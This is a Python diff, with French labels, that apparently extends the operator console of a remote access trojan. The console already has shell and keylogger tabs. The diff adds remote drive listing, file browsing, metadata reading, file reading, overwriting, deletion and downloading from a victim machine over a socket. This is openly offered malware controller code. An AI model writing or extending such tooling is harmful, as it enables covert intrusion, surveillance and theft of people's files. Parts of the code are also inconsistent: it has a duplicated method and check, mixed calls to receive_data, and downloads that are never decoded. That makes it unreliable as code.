@@ -90,6 +90,8 @@ class ToolsWindow(ctk.CTk):
         self.shell_tab = self.tabview.add("💬 Shell")
         self.keylogger_tab = self.tabview.add("⌨️ Keylogger")
         self.files_tab = self.tabview.add("📁 Fichiers")
+        self.save_btn = ctk.CTkButton(self.files_tab, text="💾 Sauvegarder", command=self.save_file)
+        self.save_btn.pack(pady=5)
         self.control_tab = self.tabview.add("📺 Contrôle")
 
         self.setup_shell_tab()
@@ -155,11 +157,106 @@ class ToolsWindow(ctk.CTk):
         self.tree = ttk.Treeview(self.files_tab)
         self.tree.pack(fill="both", expand=True, pady=10, padx=10)
         self.tree.bind("<Double-1>", self.on_item_double_click)
+        self.tree.bind("<Button-3>", self.on_right_click)
 
         self.file_content = ctk.CTkTextbox(self.files_tab, height=150)
         self.file_content.pack(fill="x", padx=10)
 
-        self.populate_directory(".", "")
+        self.metadata_label = ctk.CTkLabel(self.files_tab, text="")
+        self.metadata_label.pack(pady=5)
+
+        self.list_drives()  
+
+    def list_drives(self):
+        self.send_command("list_drives")
+        drives = self.receive_data().decode().splitlines()
+        for drive in drives:
+            self.tree.insert("", "end", text=drive, values=[drive], tags=("DIR",))
+
+    def populate_directory(self, path, parent_id):
+        self.send_command(f"listfiles {path}")
+        entries = self.receive_data().decode().splitlines()
+        for entry in entries:
+            name, entry_type = entry.split("|")
+            full_path = os.path.join(path, name).replace("\\", "/")
+            self.tree.insert(parent_id, "end", text=name, values=[full_path], tags=(entry_type,))
+
+    def on_item_double_click(self, event):
+        selected_item = self.tree.selection()[0]
+        path = self.tree.item(selected_item, "values")[0]
+
+        # Récupère les métadonnées
+        self.send_command(f"metadata {path}")
+        metadata = self.receive_data().decode()
+        self.metadata_label.configure(text=metadata)
+
+        is_dir = self.tree.item(selected_item, "tags")[0] == "DIR"
+
+        if is_dir:
+            # Déploie dynamiquement le contenu
+            if is_dir:
+                children = self.tree.get_children(selected_item)
+                if children:
+                    self.tree.delete(*children)  # Ferme
+                else:
+                    self.populate_directory(path, selected_item)  # Ouvre
+        else:
+            # Lire fichier
+            self.send_command(f"readfile {path}")
+            content = receive_data(self.client_socket)
+            try:
+                decoded = base64.b64decode(content).decode(errors="ignore")
+            except:
+                decoded = "[Fichier binaire ou invalide]"
+            self.file_content.delete("0.0", "end")
+            self.file_content.insert("end", decoded)
+
+            # Garde le chemin en mémoire pour modification
+            self.current_opened_file = path
+
+    def save_file(self):
+        if hasattr(self, "current_opened_file"):
+            raw = self.file_content.get("0.0", "end")
+            b64 = base64.b64encode(raw.encode()).decode()
+            self.send_command(f"writefile {self.current_opened_file} {b64}")
+            result = self.receive_data().decode()
+            self.log(result)
+        else:
+            self.log("Aucun fichier sélectionné.")
+
+    def on_right_click(self, event):
+        try:
+            iid = self.tree.identify_row(event.y)
+            if iid:
+                self.tree.selection_set(iid)
+                menu = ctk.CTkMenu(self, tearoff=0)
+                path = self.tree.item(iid, "values")[0]
+
+                menu.add_command(label="📂 Ouvrir", command=lambda: self.on_item_double_click(event))
+                menu.add_command(label="📥 Télécharger", command=lambda: self.download_file(path))
+                menu.add_command(label="🗑️ Supprimer", command=lambda: self.delete_file(path))
+                menu.tk_popup(event.x_root, event.y_root)
+        except Exception as e:
+            print(f"[Menu contextuel erreur] {e}")
+
+    def delete_file(self, path):    
+        self.send_command(f"deletefile {path}")
+        result = self.receive_data().decode()
+        self.log(result)
+        parent_id = self.tree.parent(self.tree.selection()[0])
+        self.tree.delete(self.tree.selection()[0])
+
+    def download_file(self, path):
+        self.send_command(f"readfile {path}")
+        content = receive_data(self.client_socket)
+        try:
+            filename = os.path.basename(path)
+            with open(f"download_{filename}", "wb") as f:
+                f.write(content)
+            self.log(f"[Téléchargé] {filename}")
+        except Exception as e:
+            self.log(f"Erreur téléchargement: {e}")
+
 
     def populate_directory(self, path, parent_id):
         self.send_command(f"listfiles {path}")
